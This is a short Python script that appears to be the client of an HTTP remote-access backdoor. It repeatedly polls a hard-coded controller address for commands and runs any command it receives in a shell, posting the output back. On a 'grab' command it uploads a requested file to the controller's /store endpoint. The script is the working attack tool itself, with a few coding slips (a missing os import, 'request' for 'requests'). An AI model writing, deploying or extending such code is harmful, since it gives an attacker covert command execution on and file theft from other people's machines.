import requests
import subprocess
import time

while True:
    req = requests.get('http://10.110.143.18:1111')
    command = req.text

    if 'terminate' in command:
        break

    elif 'grab' in command:
        grab,path = command.split('*')
        if os.path.exists(path):
            url = "http://10.110.143.18:1111/store"
            files = {'file': open(path,'rb')}
            r = request.post(url,files=files)
        else:
            request.post("http://10.110.143.18:1111",data="File was not found")
            
    else:
        cmd = subprocess.Popen(command, shell=True,stdout=subprocess.PIPE)
        post_response = requests.post(url='http://10.110.143.18:1111',data=cmd.stdout.read())
        time.sleep(3)
